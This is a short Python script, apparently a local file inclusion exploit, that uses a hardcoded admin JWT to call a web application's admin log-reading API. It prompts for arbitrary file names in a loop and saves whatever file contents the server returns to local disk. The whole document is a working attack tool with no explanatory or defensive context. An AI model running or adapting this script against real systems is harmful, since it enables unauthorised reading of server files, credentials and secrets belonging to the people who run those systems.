import requests
import sys
import os
if len(sys.argv) < 2:
    print("Usage : python3 lfi.py url")
    sys.exit(1)

base_url = sys.argv[1]

url = sys.argv[1].rstrip("/") + "/api/v1/admin/read/log"

headers = {"Authorization": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6IkFkbWluIiwid2FsSWQiOiJmMGVjYTZlNS03ODNhLTQ3MWQtOWQ4Zi0wMTYyY2JjOTAwZGIiLCJleHAiOjMzMjU5MzAzNjU2fQ.v0qyyAqDSgyoNFHU7MgRQcDA0Bw99_8AEXKGtWZ6rYA",
           "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36"}

while True:
    file_name = input("Enter file name to read: ")

    if file_name.lower() == "exit":
        break

    params = {'log_file_name': file_name}

    response = requests.get(url, headers=headers, params=params)

    #print(response.status_code)

    if response.status_code == 201:
        data = response.json()

        file_key = next(k for k in data.keys() if k != "Status")
        file_content = "".join(data[file_key])

        local_filename = os.path.basename(file_name)

        with open(local_filename, "w", encoding="utf-8") as f:
            f.write(file_content)

        print(f"[+] Saved {local_filename}")
    else:
        print("file not found or something went wrong")
